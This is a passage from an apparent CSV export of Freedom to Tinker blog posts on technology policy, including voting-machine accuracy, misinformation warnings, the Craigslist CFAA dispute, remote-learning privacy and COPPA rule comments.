target, would not be affected. In the recount, with humans looking at the votes, the votes were counted accurately. Humans are not likely to interpret a fold line as a vote! So the official Windham results (after the recount) are trustworthy. But many towns in New Hampshire use the same AccuVote optical-scan voting machines. We can legitimately wonder whether some elections in other towns (that were not recounted by hand) got the wrong result. I’ll discuss that question in my next post. In my next article I’ll examine: What do the national voting-machine standards say about how voting machines should distinguish fold-lines from intentional vote-marks? Could a build-up of dust make the voting machine more likely to misinterpret folds as marks? What do election administrators in other states do to avoid this problem? Should New Hampshire throw away its voting machines and buy new ones, or throw away its voting machines and count votes by hand? Or are there measures they could take to use these same machines in a trustworthy way? What series of circumstances led to this problem in Windham 2020, and how could those corrective measures prevent anything like this from happening again? Could improved technology in optical-scan voting machines be less susceptible to this problem?"
"113","2021-07-26","2023-03-24","https://freedom-to-tinker.com/2021/07/26/warnings-that-work-combating-misinformation-without-deplatforming/","Ben Kaiser, Jonathan Mayer, and J. Nathan Matias This post originally appeared on Lawfare. “They’re killing people.” President Biden lambasted Facebook last week for allowing vaccine misinformation to proliferate on its platform. Facebook issued a sharp rejoinder, highlighting the many steps it has taken to promote accurate public health information and expressing angst about government censorship. Here’s the problem: Both are right. Five years after Russia’s election meddling, and more than a year into the COVID-19 pandemic, misinformation remains far too rampant on social media. But content removal and account deplatforming are blunt instruments fraught with free speech implications. Both President Biden and Facebook have taken steps to dial down the temperature since last week’s dustup, but the fundamental problem remains: How can platforms effectively combat misinformation with steps short of takedowns? As our forthcoming research demonstrates, providing warnings to users can make a big difference, but not all warnings are created equal. The theory behind misinformation warnings is that if a social media platform provides an informative notice to a user, that user will then make more informed decisions about what information to read and believe. In the terminology of free speech law and policy, warnings could act as a form of counterspeech for misinformation. Facebook recognized as early as 2017 that warnings could alert users to untrustworthy content, provide relevant facts, and give context that helps users avoid being misinformed. Since then, Twitter, YouTube, and other platforms have adopted warnings as a primary tool for responding to misinformation about COVID-19, elections, and other contested topics. But as academic researchers who study online misinformation, we unfortunately see little evidence that these types of misinformation warnings are working. Study after study has shown minimal effects for common warning designs. In our own laboratory research, appearing at next month’s USENIX Security Symposium, we found that many study participants didn’t even notice typical warnings—and when they did, they ignored the notices. Platforms sometimes claim the warnings work, but the drips of data they’ve released are unconvincing. The fundamental problem is that social media platforms rely predominantly on “contextual” warnings, which appear alongside content and provide additional information as context. This is the exact same approach that software vendors initially took 20 years ago with security warnings, and those early warning designs consistently failed to protect users from vulnerabilities, scams, and malware. Researchers eventually realized that not only did contextual warnings fail to keep users safe, but they also formed a barrage of confusing indicators and popups that users learned to ignore or dismiss. Software vendors responded by collaborating closely with academic researchers to refine warnings and converge on measures of success; a decade of effort culminated in modern warnings that are highly effective and protect millions of users from security threats every day. Social media platforms could have taken a similar approach, with transparent and fast-paced research. If they had, perhaps we would now have effective warnings to curtail the spread of vaccine misinformation. Instead, with few exceptions, platforms have chosen incrementalism over innovation. The latest warnings from Facebook and Twitter, and previews of forthcoming warnings, are remarkably similar in design to warnings Facebook deployed and then discarded four years ago. Like most platform warnings, these designs feature small icons, congenial styling, and discreet placement below offending content. When contextual security warnings flopped, especially in web browsers, designers looked for alternatives. The most important development has been a new format of warning that interrupts users’ actions and forces them to make a choice about whether to continue. These “interstitial” warnings are now the norm in web browsers and operating systems. In our forthcoming publication—a collaboration with Jerry Wei, Eli Lucherini, and Kevin Lee—we aimed to understand how contextual and interstitial disinformation warnings affect user beliefs and information-seeking behavior. We adapted methods from security warnings research, designing two studies where participants completed fact-finding tasks and periodically encountered disinformation warnings. We placed warnings on search results, as opposed to social media posts, to provide participants with a concrete goal (finding information) and multiple pathways to achieve that goal (different search results). This let us measure behavioral effects with two metrics: clickthrough, the rate at which participants bypassed the warnings, and the number of alternative visits, where after seeing a warning, a participant checked at least one more source before submitting an answer. In the first study, we found that laboratory participants rarely noticed contextual disinformation warnings in Google Search results, and even more rarely took the warnings into consideration. When searching for information, participants overwhelmingly clicked on sources despite contextual warnings, and they infrequently visited alternative sources. In post-task interviews, more than two-thirds of participants told us they didn’t even realize they had encountered a warning. For our second study, we hypothesized that interstitial warnings could be more effective. We recruited hundreds of participants on Mechanical Turk for another round of fact-finding tasks, this time using a simulated search engine to control the search queries and results. Participants could find the facts by clicking on relevant-looking search results, but they would first be interrupted by an interstitial warning, forcing them to choose whether to continue or go back to the search results. The results were stunning: Interstitial warnings dramatically changed what users chose to read. Users overwhelmingly noticed the warnings, considered the warnings, and then either declined to read the flagged content or sought out alternative information to verify it. Importantly, users also understood the interstitial warnings. When presented with an explanation in plain language, participants correctly described both why the warning appeared and what risk the warning was highlighting. Platforms do seem to be—slowly—recognizing the promise of interstitial misinformation warnings. Facebook, Twitter, and Reddit have tested full-page interstitial warnings similar to the security warnings that inspired our work, and the platforms have also deployed other formats of interstitials. The “windowshade” warnings that Instagram pioneered are a particularly thoughtful design. Platforms are plainly searching for misinformation responses that are more effective than contextual warnings but also less problematic than permanent deplatforming. Marjorie Taylor Greene’s vaccine misinformation, for example, recently earned her a brief, 12-hour suspension from Twitter, restrictions on engagement with her tweets, and contextual warnings—an ensemble approach to content moderation. But platforms remain extremely tentative with interstitial warnings. For the vast majority of mis- and disinformation that platforms identify, they still either apply tepid contextual warnings or resort to harsher moderation tools like deleting content or banning accounts. Platforms may be concerned that interstitial warnings are too forceful, and that they go beyond counterspeech by nudging users to avoid misinformation. But the point is to have a spectrum of content moderation tools to respond to the spectrum of harmful content. Contextual warnings may be appropriate for lower-risk misinformation, and deplatforming may be the right move for serial disinformers. Interstitial warnings are a middle-ground option that deserve a place in the content moderation toolbox. Remember last year, when Twitter blocked a New York Post story from being shared because it appeared to be sourced from hacked materials? Amid cries of censorship, Twitter relented and simply labeled the content. An interstitial warning would have straddled that gulf, allowing the content on the platform while still making sure users knew the article was questionable. What platforms should pursue—and the Biden-Harris administration could constructively encourage—is an agenda of aggressive experimentalism to combat misinformation. Much like software vendors a decade ago, platforms should be rapidly trying out new approaches, publishing lessons learned, and collaborating closely with external researchers. Experimentation can also shed light on why certain warning designs work, informing free speech considerations. Misinformation is a public crisis that demands bold action and platform cooperation. In advancing the science of misinformation warnings, the government and platforms should see an opportunity for common ground. We thank Alan Rozenshtein, Ross Teixeira and Rushi Shah for valuable suggestions on this piece. All views are our own."
"114","2021-08-31","2023-03-24","https://freedom-to-tinker.com/2021/08/31/we-need-a-personal-digital-advocate/","I recently looked up a specialized medical network. For weeks following the search, I was bombarded with ads for the network and other related services: the Internet clearly thought I was on the market for a new doctor. The funny thing is that I was looking this up for someone else and all this information, which was being pushed on me across browsers and across devices, was not really relevant. I wish I could muster such relentlessness and consistency for things that really matter to me! This is but one example of the huge imbalance between the power of algorithms that track our economic interactions online and the power of individual consumers to have a say in the information being collected about them. So here we are being offered products that might not be in our best interest based on our past search histories. Even worse, individually, there is no way for us to know whether economic opportunities are being advertised equitably. This is true in small things, such as price discrimination on shoes, and in important things, such as job searches. Does your internet reality reflect a lower-wage world because you are known to the internet to be female? Current rules and regulations that attempt to protect our best interests online are woefully lacking, which is understandable. They were never designed for the digital world. It is not just the difficulty of documenting (and proving) bad behavior such as discrimination or dark patterns, but the task of allocating responsibility – untangling the stack of intertwined ad technologies and entities responsible for the bad behavior. The most viable regulation-based proposals tend to revolve around holding companies such as Facebook or Google accountable through regulation. This approach is important but is limited by several factors: it does not work well across corporate and national boundaries, it exposes companies to a significant conflict of interests while implementing such regulations, and it does nothing to address the growing imbalance between the user and the data centers behind the phone screen. What we would like to propose is a radically different approach to righting the balance of power between algorithms and individual users: the Personal Digital Advocate. The broad point of this advocate would be to give the consumers (both as individuals and as a group) an algorithm that will be answerable only to them and have equal computing power and equal access to information to that which companies currently possess. Here is a sample of the benefits such an advocate could provide: You can’t possibly know when you are being upsold by a company because your previous purchase history indicates that you are not going to check. The advocate will be able to detect that by having access to the prices on the same product that were offered to other people in the past several months. The advocate will be able to detect instances of gender and race-based discrimination in job searches by being able to detect that you are not getting access to the full range of jobs for which you qualify. Instead of incomplete, messy, often wrong data about you being bought and sold on the internet behind your back and outside of your control (which is the default mode now), you will be able to use your digital advocate to freely offer certain information about yourself to companies in a way that will benefit you, but also the company. For instance, suppose you are shopping for a minivan. You have looked at all kinds of brands, but you know that you will only buy a Toyota or a Honda. This is information that you might not mind sharing if there were a way to do so. It could mean that Kia dealerships will stop wasting their money and your time by advertising to you, and the ads you do get might actually become more relevant. For a digital advocate to become viable, two major policy changes will need to take place – one in the legal and one in the technical domain: Legal: In the absence of a legal framework, it will always be more profitable for a digital advocate to sell the consumer out (e.g., it is easy to see how it could start steering people toward certain products for a commission). Fortunately, a legal framework to prevent this already exists in other arenas. One good example is the lawyer/client relationship. It might otherwise be very profitable for a law firm to betray a client and use his information against him (e.g., by leaking willingness to pay in a real estate deal and then collecting commission), but any lawyer who does that will immediately be disbarred, or worse. There needs to be a “bar” of sorts for the digital advocate. Technical: At a technical level, a technological framework will need to be developed that would allow the advocate to access all the information it needs when it needs it. “Digital rights” laws such as GDPR and CCPA will need to incorporate a digital access mandate – allowing the end-user to nominate a bot to uphold her rights (such as the right to refuse cookies without having to go through a dark pattern, or the ability to download one’s data in a timely manner). Regulations always tend to fall behind advances in technology. This is true across different industries and historically. For instance, there was a notable lag between the time when medications started being mass produced and the emergence of the FDA. Our ancestors who lived in the “gap” probably consumed “medications” ranging from harmlessly ineffective to outright dangerous. The algorithms that govern our online lives (which merges more and more with our regular lives) change more quickly than any other industry, and moreover, are able to adapt automatically to regulations. Regulations, which have trouble keeping up with progress in general, will especially struggle against such an adaptive opponent. Thus, the only sustainable way to protect ourselves online is to create an algorithm that will protect us and will be able to develop at the same rate as the ones that can wittingly or unwittingly harm us. Mark Braverman is a professor of computer science at Princeton University, and is part of the theory group. His research focuses on algorithms and computational complexity theory, as well as building connections to other disciplines, including information theory, mathematical analysis, and mechanism design. A longer version of this post is available in the form of an essay here."
"115","2021-09-02","2023-03-24","https://freedom-to-tinker.com/2021/09/02/national-ai-research-infrastructure-needs-to-support-independent-evaluation-of-performance-claims/","By Sayash Kapoor, Mihir Kshirsagar, and Arvind Narayanan Our response to the National AI Research Resource RFI highlights the significance of supporting a research infrastructure that is designed to independently test the validity of the claims of AI performance. In particular, we draw attention to the widespread phenomenon of the industry peddling what we call “AI snake oil” — promoting an AI solution that cannot work as promised. Relatedly, we highlight how AI-based scientific research is often plagued by overly optimistic claims about its results and suffers from reproducibility failures. We also offer suggestions on how the NAIRR can promote responsible data stewardship models. We recommend that the Task Force’s implementation roadmap include establishing a public infrastructure that can critically evaluate AI performance claims as that is vital to ensuring that AI research serves our shared democratic values. Note, the AI Task Force has extended the deadline for submitting public responses to October 1, 2021. CITP-RFI-Response-National-AI-Research-Resource-Sep.-2021-1Download"
"116","2021-10-29","2023-03-24","https://freedom-to-tinker.com/2021/10/29/four-2020-lawsuits-over-internet-voting/","Citizens with disabilities (and voters living abroad) must have the substantive right to vote—that’s the law. Sometimes that turns into a demand for internet voting. But as I wrote earlier this year, internet voting is dangerously insecure, it’s not what most voters with disabilities want, and there are much better ways of accommodating voters with disabilities, and the states should implement those accommodations. Last year saw several lawsuits demanding internet voting as an accommodation—that is, the return of voted ballots by internet. The most recent of these (in New Hampshire) was just recently settled. In 2020, the National Federation for the Blind sued the State of Virginia asking for internet voting (and other accommodations for voters with disabilities). The parties settled for no internet voting, but other accommodations for voters with disabilities. In 2020, New Jersey quietly took steps to allow internet voting, were sued on the basis that this would be both insecure and illegal; and then agreed not to pursue internet voting in New Jersey, but to use other means to accommodate voters with disabilities. In 2020, a group of plaintiffs living abroad sued 7 states in U.S. District Court asking for internet voting. The court denied their request for a preliminary injunction, and then the plaintiffs moved to dismiss the case. In 2020, the National Federation for the Blind sued the State of New Hampshire asking for internet voting, and for accessibility improvements in the State’s election website (that provides information for voters). The parties settled for no internet voting, but other accommodations for voters with disabilities (some of which New Hampshire already had in place), and for improvements in the web site. There’s a pattern here. The courts have not recognized a right to vote by internet; these States have declined to adopt this insecure method of voting; and these States have been willing to adopt other reasonable accommodations for voters with disabilities. Perhaps it would be a good idea for the NFB to remove internet ballot return from its set of demands, and focus on the other reasonable and practical reforms that they have been requesting (or suing for): Make websites accessible, improve procedures in the way voters with Print Disabilities are permitted to prepare and return their ballots, and perhaps some of the improvements suggested by Noel Runyan at the end of my previous article. Added shortly after publication: It has come to my attention that there was a fifth 2020 lawsuit, Taliaferro et al. v. North Carolina State Board of Elections. I’ll write about that in a future article."
"117","2014-11-03","2023-03-24","https://freedom-to-tinker.com/2014/11/03/a-technological-approach-to-better-living-for-d-c-and-beyond/","Washington, D.C., could be a leader in the United States — and worldwide — in using technology to improve the lives of its residents and visitors. As a rapidly growing city with a diverse and highly educated population, the District is a leader in law, education, tourism and, of course, government. With this mass of educated and engaged citizens, the District can use technology to make local government more efficient and promote the further development of vibrant commercial corridors across the city. That’s why the District government should join other leading cities in establishing an office dedicated to tech-based solutions to local, urban problems. The networks that communities use to share information and facilitate commerce have evolved across U.S. history from waterways to railroads to broadband. As the Georgetown waterfront was once a profitable international shipping hub, cities today are leveraging their advantages to attract technology innovators. In Boston, for example, the mayor’s office found partners for its civic technology incubator (the Office of New Urban Mechanics) at Harvard University and Emerson College. Kansas City won a contest and became the first city where Google built its super-high-speed Internet service. And New York City, under the leadership of tech-savvy mayor Michael Bloomberg, developed in 2011 a “Road Map for the Digital City” to establish itself as a world leader in Internet access, open government, citizen engagement and digital industry growth. True to the District’s status as a world political capital, the leaders in the city’s government, business and educational institutions should work together to benefit the region’s civic and economic future: ● The next mayor must establish a unified program housed in the mayor’s office and focused on using technology, data and innovation to make the city’s government more efficient and responsive to residents’ needs. Initiatives, perhaps similar to Boston’s Office of New Urban Mechanics, should be developed and executed in partnership with local companies, universities and nonprofits. ● Within such a program, the businesses and government could systematically encourage and support new grass-roots organizations similar to the Kennedy Street Development Association, which is using Facebook and Twitter to recruit residents and businesses, and whose investments signal the rebranding of an ailing commercial corridor as a lively mixed commercial and residential neighborhood. Memphis’s MEMShop business incubation program is a good model. ● Critical support for such a unified program is locally available because many global experts on telecommunications and Internet policy are already here. The District’s business leaders could easily engage this brain trust in developing technology policies and regulations that support growing broadband infrastructure and foster economic growth resulting from proven applications, such as Uber, Lyft and Airbnb. By taking the lead on civic innovation, the District could be a template for other governments in the area. As the whole region shares information, researchers, local companies and governments can come together to tackle some of the biggest challenges we face, such as homelessness, education and transportation. With this spirit of collaboration, local Washington, D.C., can be a model for the federal D.C."
"118","2013-06-18","2023-03-24","https://freedom-to-tinker.com/2013/06/18/i-join-the-eff-and-others-in-calling-for-craigslist-to-drop-cfaa-claims/","[Cross-posted on my blog, Managing Miracles] Craigslist is suing several companies that scrape data from Craigslist advertisements. These companies, like Padmapper and 3taps, repurpose the data in order to provide more useful ways of searching through the ads. I have written about this in earlier posts, “Dear Craig: Voluntarily Dismiss with Prejudice,” and “A Response to Jerry: Craig Should Still Dismiss.” Fundamentally, I think that the company’s tactic of litigating against perceived competitors is bad for Craigslist (because it limits the reach of its users’ ads and thus the success of Craigslist), it is bad for the law and policy of the web (because scraping of public web sites has historically been a well-established and permissible practice that beneficially spreads public information), and is in bad taste (given Craiglist’s ethos of doing well by doing good). One of the most problematic aspects of the lawsuit is the set of claims under the Computer Fraud and Abuse Act (CFAA) and its California state-law counterpart. The CFAA, passed in 1986, introduces criminal and civil penalties for “unauthorized access” to “protected computers.” The CFAA was largely a reaction to generalized fear of “computer hacking,” and it did not envision the public internet as we know it today. Nevertheless, some have tried to apply the CFAA to public web sites. This approach has been widely frowned upon by both the tech community and the courts. For instance, the Center for Democracy and Technology (CDT) and the Electronic Frontier Foundation (EFF) are actively pushing to reform the CFAA because it has been subject to prosecutorial abuse. Craigslist has nevertheless alleged violations of the CFAA based on access to their public web site. Today I signed on to an an amicus brief written by the EFF–which was also co-signed by other scholars in the field–that urges the court to dismiss these ill-advised CFAA claims. The brief reads, in part: “The CFAA does not and should not impose liability on anyone who accesses information publicly available on the Internet. Because the CFAA and Penal Code S 502 imposes both civil and criminal liability, it must be interpreted narrowly. That means information on a publicly accessible website can be accessed by anyone on the Internet without running afoul of criminal computer hacking laws. In the absence of access, as opposed to use, restrictions, Craigslist cannot use these anti-hacking laws to complain when the information it voluntarily broadcasts to the world is accessed, even if it is upset about a competing or complementary business.” Craig Newmark, founder of Craigslist, actually sits on the Advisory Board of the EFF. I have been bewildered about why the company’s Founder and Chairman appears to be going along with such a misguided attack. As it happens, I ran into him a couple of weeks ago at the Personal Democracy Forum, where he was advocating for his various philanthropic causes via his organization, craigconnects. Craig has long maintained that he is merely a “customer support representative” for the company, and that he will only comment on how the company’s decisions relate to what the users want. He told Ars Technica last year that, “I can say that our culture has always been community-driven, and what they tell us, in large numbers and for years, [is] that their posts are not to be used by others for profit.” When I ran into Craig, I told him that it was my impression that users want their advertisements to find successful buyers (or traders, or whatever), and that it seems logical that they would want their ads spread as widely as possible. He urged me to make sure that when writing about the issue I take care to get my facts straight. I asked him what facts he thought that I was unaware of, but he wouldn’t elaborate. He then proceeded to talk at more length about the importance of fact-based journalism–which is apparently one of the issues he is focusing on via craigconnects, although I had trouble figuring out how it related to the issue at hand. Nevertheless, I took to the (nearly unusable) Craigslist forums in order to try to find evidence that users do not want their advertisements spread across the web. I found some users that objected to “parasites” that build businesses on top of user advertisement data, but I also found other users that thought that the lawsuit ran counter to their interests. What counts as “large numbers,” and how does Craig decide which users to listen to? I have no idea. However, in fact-check land, Craig was quoted last year as saying, “Actually, we take issue with only services which consume a lot of bandwidth, it’s that simple.” Or maybe it’s not. 3Taps was allegedly scraping all Craigslist advertisement data only indirectly, from Google caches until Craigslist allegedly added a “noarchive” tag in order to tell Google to stop offering cached versions. For their part, Craigslist claims that they had long been including the “noarchive” tag, so I suppose that this will come out in the discovery process if we get to that stage. Regardless, it appears that Craigslist is fine with Google or Bing consuming a “lot of bandwidth,” but not with them passing it along to services that it perceives to be a threat to its core business. Of course, if Craigslist were really concerned with rate-limiting for the sake of bandwidth, it could offer an API like so many other modern web sites. In any event, Craigslist is behaving like a jealous incumbent. If that were all that were at stake, then it would be enough to say “shame on them” and move on. However, this lawsuit threatens to create and reinforce bad law precisely at the time when the larger community–of which Craig is a part–is calling for its reform. Drop the case, Craig."
"119","2021-11-19","2023-03-24","https://freedom-to-tinker.com/2021/11/19/faculty-search-in-information-technology-policy/","I’m happy to announce that Princeton University is recruiting a faculty member in information technology policy. The position is open rank — assistant, associate, or full professor — and we welcome applicants from any relevant discipline. The successful candidate will likely be jointly appointed in the School of Public and International Affairs and a disciplinary department, and be part of the CITP community. We are reviewing applications on a rolling basis. We encourage interested candidates to apply by December. Apply here. If you have questions about the position, you are welcome to reach out to me at *protected email*."
"120","2020-12-15","2023-03-24","https://freedom-to-tinker.com/2020/12/15/new-research-on-privacy-and-security-risks-of-remote-learning-software/","This post and the paper is jointly authored by Shaanan Cohney, Ross Teixeira, Anne Kohlbrenner, Arvind Narayanan, Mihir Kshirsagar, Yan Shvartzshnaider, and Madelyn Sanfilippo. It emerged from a case study at CITP’s tech policy clinic. As universities rely on remote educational technology to facilitate the rapid shift to online learning, they expose themselves to new security risks and privacy violations. Our latest research paper, “Virtual Classrooms and Real Harms,” advances recommendations for universities and policymakers to protect the interests of students and educators. The paper develops a threat model that describes the actors, incentives, and risks in online education. Our model is informed by our survey of 105 educators and 10 administrators who identified their expectations and concerns. We use the model to conduct a privacy and security analysis of 23 popular platforms using a combination of sociological analyses of privacy policies and 129 state laws (available here), alongside a technical assessment of platform software. Our threat model diagrams typical remote learning data flows. An “appropriate” flow is informed by established educational norms. The flow marked end-to-end encryption represents data that is not ordinarily accessible to the platform. In the physical classroom, there are educational norms and rules that prevent surreptitious recording of the classroom and automated extraction of data. But when classroom interactions shift to a digital platform, not only does data collection become much easier, the social cues that discourage privacy harms are weaker and participants are exposed to new security risks. Popular platforms, like Canvas, Piazza, and Slack, take advantage of this changed environment to act in ways that would be objectionable in the physical classroom—such as selling data about interactions to advertisers or other third parties. As a result, the established informational norms in the educational context are severely tested by remote learning software. We analyze the privacy policies of 23 major platforms to find where those policies conflict with educational norms. For example, 41% of the policies permitted a platform to share data with advertisers, which conflicts with at least 21 state laws, while 23% allowed a platform to share location data. However, the privacy policies are not the only documents that shape platform practices. Universities use Data Protection Addenda (DPAs) for the institutional licenses that they negotiate with the platform to supplement or even supplant the default privacy policy. We reviewed 50 DPAs from 45 Universities, finding that the addenda were able to cause platforms to significantly shift their data practices, including stricter limits on data retention and use. We also discuss the limitations of current federal and state regulation to address the risks we identified. In particular, the current laws lack specific guidance for platforms and educational institutions to protect privacy and security and have limited penalties for noncompliance. More broadly, the existing legal framework is geared toward regulating specific information types and a small subset of actors, rather than specifying transmission principles for appropriate use that would be more durable as the technology evolves. What can be done to better protect students and educators? We offer the following five recommendations: Educators should understand that there are significant differences between free (or individually licensed) versions of software and institutional versions. Universities need to work on informing educators about those differences and encourage them to use institutionally-supported software. Universities should use their ability to negotiate DPAs and institute policies to make platforms modify their default practices that are in tension with institutional values. Crucially, universities should not spend all their resources on a complex vetting process before licensing software. That path leads to significant usability problems for end users, without addressing the security and privacy concerns. Instead, universities should recognize that significant user issues tend to surface only after educators and students have used the platforms and create processes to collect those issues and have the software developers rapidly fix the problems. Universities should establish clear principles for how software should respect the norms of the educational context and require developers to offer products that let them customize the software for that setting. Federal and state regulations can be improved by making platforms more accountable for compliance with legal requirements, and giving institutions a mandate to require baseline security practices, much like financial institutions have to protect consumer information under the Federal Trade Commission’s Safeguards Rule. The shift to virtual learning requires many sacrifices from educators and students already. As we integrate these new learning platforms in our educational systems, we should ensure they reflect established educational norms and do not require users to sacrifice usability, security, and privacy. We thank the members of Remote Academia and the university administrators who participated in the study. Remote Academia is a global Slack-based community, that gives faculty and other education professionals a space to share resources and techniques for remote learning. It was created by Anne, Ross, and Shaanan."
"121","2020-01-15","2023-03-24","https://freedom-to-tinker.com/2020/01/15/improving-protections-for-childrens-privacy-online/","CITP’s Tech Policy Clinic submitted a Comment to the Federal Trade Commission in connection with its review of the COPPA Rule to protect children’s privacy online. Our Comment explains why it is important to update the COPPA Rule to keep it current with new privacy risks, especially as children spend increasing amounts of time online on a variety of connected devices. What is the Children’s Online Privacy Protection Act (COPPA)? As background, Congress in 1998 gave the FTC authority to issue rules that govern how online commercial service providers should collect, use or disclose information about children under the age of 13. The FTC issued the first version of the Rule in 2000 which requires providers to place parents in control over what information is collected from their young children online. The Rule applies to both providers of services directed to children under 13 as well as those serving a general audience who have actual knowledge that they are collecting, using, or disclosing personal information from children under 13. This Rule was subsequently revised, after a period of public comment, in 2013 to account for technological developments, including the pervasive use of mobile apps. In 2019, the FTC announced it was revisiting the Rule in light of ongoing questions about the efficacy of the Rule in a data-fueled online marketplace and soliciting public comment on potential improvements to the Rule. Core Recommendations to Update the COPPA Rule Our Comment makes three main points: We encourage the FTC to develop rules that promote external scrutiny of provider practices by making the provider’s choices about how they are complying with the Rule available in a transparent and machine-readable format. We recommend that the FTC allow providers to rely on an exemption from collecting or tracking information related to “internal operations” only under extremely limited circumstances, otherwise the exception risks swallowing the rule. We offer some suggestions on how education technology providers should be responsive to parents and recommend that the FTC conduct further studies about how such technology is being used in practice. We elaborate on each point below. Enabling Effective External Compliance Checks Through Transparency One of the central challenges with the COPPA Rule today is that it is very difficult for external observers (parents, researchers, journalists or advocacy groups) to understand how an online provider has decided to comply with the Rule. For example, it is not clear if a site believes it is in compliance with the Rule because it argues that none of its content is directed at children or because it has implemented rules that seek appropriate consent before gathering information about users. Making a provider’s choices on compliance transparent will enable meaningful external scrutiny of practices and hold providers to account. Under the COPPA Rule providers are responsible for determining whether or not a service is child directed by looking to a variety of factors. If the service is directed at children, then the provider must ensure they have verified parental consent before collecting information about users. If the audience is of mixed age, then the provider must ensure that it does not collect information about users under the age of 13 without parental consent. The determination about whether a service is child directed, as the FTC explains, includes factors such as “its subject matter, visual content, use of animated characters or child-oriented activities and incentives, music or other audio content, age of models, presence of child celebrities or celebrities who appeal to children, language or other characteristics of the Web site or online service, as well as whether advertising promoting or appearing on the Web site or online service is directed to children . . . [and] competent and reliable empirical evidence regarding audience composition, and evidence regarding the intended audience.” If the service is child directed and children under the age of 13 are the primary audience, then it is “primarily child directed.” If services that are child directed, but do not target children as the primary audience, they are “child directed, but mixed audience” services under the COPPA Rule. If a mixed audience service seeks to collect information about users it can choose to implement an age gate to ensure it does not collect data about underage users. An age gate is, a mechanism that asks users to provide their age or date of birth in an age-neutral way. Our principal recommendation is that the COPPA Rule should be revised to explicitly facilitate external scrutiny by requiring providers to make their design choices more open to external review. Specifically, we suggest that the FTC should make sites or services disclose, in a machine-readable format, whether they consider themselves, in whole or part, “directed to children” under COPPA. This allows academic researchers (or parents) to examine what the provider is actually doing to protect children’s privacy. We also recommend that the FTC establish a requirement that, if a website or online service is using an age gate as part of its determination that it is not child directed, it must publicly post a description of the operation of the age gate and what steps it took to validate that children under 13 cannot circumvent the age gate. In addition, drawing on our work on online dark patterns, we suggest that the FTC examine the verifiable parental consent mechanisms used by providers to ensure that parents are being given the opportunity to make fully informed and free choices about their child’s privacy. Finally, we suggest some ways that platforms such as iOS or Android can be enlisted by the FTC to play a more effective role in screening users and verifying ages. Restrict Providers from Relying on the “Internal Operations” Exception Another significant issue with current practices is that providers rely on an exception for providing parental notice and obtaining consent before collecting personal information when they use persistent identifiers for “internal operations.” The 2013 revisions to the Rule included this new exception, but required it to be used for a limited set of circumstances necessary to deliver the service. It appears many providers now use that exception for a wide variety of purposes that go well beyond what is strictly necessary to deliver the service. In particular, users have no external way to verify whether certain persistent identifiers, such as cookies, are being used for impermissible purposes. Therefore, our Comment urges the FTC to require providers to be transparent about how they rely on the “internal operations” exception when using certain persistent identifiers and limit the circumstances when the providers are allowed to use such an exception. Give Parents Control Over Information Collected by Educational Technology Service Providers Finally, our Comment addresses the FTC’s query about whether a specific exception for parental consent is warranted for the growing market of providers of educational technology services to children (and their parents) in the classroom and at home. We recommend that the FTC should study the use of educational technology in the field before considering a specific exception to parental consent. In particular, we explain that any rule should cover the following issues: First, parents should be told, in an accessible manner, what data educational technology providers collect about their children, how that data is used, who has access to the data, and how long it is retained. Parents should also have the right to request that data about their children are deleted. Second, school administrators should be given guidance on how to make informed decisions about selecting educational technology providers, develop policies that preserve student privacy, and train educators to implement those policies. Third, the rule should clarify how school administrators and educational technology providers are accountable to parents for how data about their children are collected, used and maintained. Fourth, the FTC needs to clearly define what is meant by “educational purposes” in the classroom in considering any exceptions for parental consent. * The Comment was principally drafted by Jonathan Mayer and Mihir Kshirsagar, along with Marshini Chetty, Edward W. Felten, Arunesh Mathur, Arvind Narayanan, Victor Ongkowijaya, Matthew J. Salganik, Madelyn Sanfilippo, and Ari Ezra Waldman."
"122","2020-02-03","2023-03-24","https://freedom-to-tinker.com/2020/02/03/citp-tech-policy-boot-camp-2019/","[This post was written by Liza Paudel, MPA’21 and Allison Huang, History’20.] Over Fall Break, the Center for Information Technology Policy (CITP) hosted 17 current students on a two-day tech policy bootcamp in Washington D.C. The group was a mix of undergraduate and graduate students from various disciplines including Computer Science, Public Policy, Economics, and History. The students were accompanied by CITP professors and staff, Tithi Chattopadhyay, Ed Felten, Mihir Kshirsagar, and Matt Salganik. Over the course of the two days, students met with technologists, researchers, public policy professionals, and government officials, and learned about the tech policy landscape across the tech industry, regulatory agencies, and research institutions. On the first day, students met with the Federal Trade Commission (FTC) Commissioner Noah Joshua Phillips and staff at FTC, and discussed the FTC’s role in anti-trust and consumer protection. This was followed by a reception where students mingled with alumni that work in tech policy-related fields on and off the hill. On the second day, students met with Pablo Chavez ’93, the head of Public Policy and Government Affairs at Google Cloud, and researchers at the Brookings Institution. At Brookings, the students and researchers discussed Brookings’ cross-cutting tech policy research initiatives, Artificial Intelligence (AI) governance, its implications for social and foreign policy, as well as the promise of large-scale data analysis for more effective policymaking. Finally, students met with Deputy Chief Technology Officer of the United States and Assistant Director of Artificial Intelligence Dr. Lynne Parker and staff at the White House Office of Science and Technology Policy. At the White House, students learned about how the Executive Branch approaches agenda-setting, stakeholder engagement, and inter-agency collaboration on tech policy. Some of the broad themes that emerged are highlighted below: Public pressure to do something is mounting. As public awareness of issues like AI systems, protection of personal data, algorithmic bias, and anti-trust, grows, regulatory agencies, industry, and research institutions are feeling the need to prioritize tech policy issues on their agenda. The interest in regulating ‘big tech’ more heavily has also gained momentum, and there seems to be tacit understanding that more regulation is coming. Regulatory agencies and research institutions are thus looking for effective ways to bring together stakeholders and think through the balance between enabling innovation and the necessary regulatory burden. Tech companies, for their part, have their own ethics principles and have created codes of conduct in anticipation. With increased public interest and news coverage, there has also been a rise in misinformation and public confusion. For example, one researcher noted how he has often had to expel away media narratives of ‘Ex-Machina-style AI taking over the world’ that largely shape public perception of the dangers of AI. Everyone’s eyes are on one another. The tech industry is looking to the government, the government to the industry, and research institutions to both, as disparate attempts to gain new understandings of emerging technologies are moving forward on all three. Each is carving out its own space in the still nascent landscape. The relationship between technology companies and policy institutions is also complicated, hindering real collaboration. While the ‘revolving door’ between the two was a recurring theme in discussions, the old schism between the public and the private continues to persist as well. The problems are interdisciplinary, so should the solutions be. There is both tacit understanding and explicit expression that the government lacks the information and tools to understand and regulate emerging technologies. There is a dearth of technical experts who are also well-versed in policy and legislation, and vice versa. Multiple speakers noted how lawyers do some of this work, but only up to a certain degree because there are technical limitations to their training. Thus, there is a growing need for computer scientists and public policy students to be interdisciplinary in their academic training. Overall, the tech policy boot camp illustrated the need for Princeton students to nurture interdisciplinary technical and non-technical skills to have impactful and rewarding careers in tech policy."
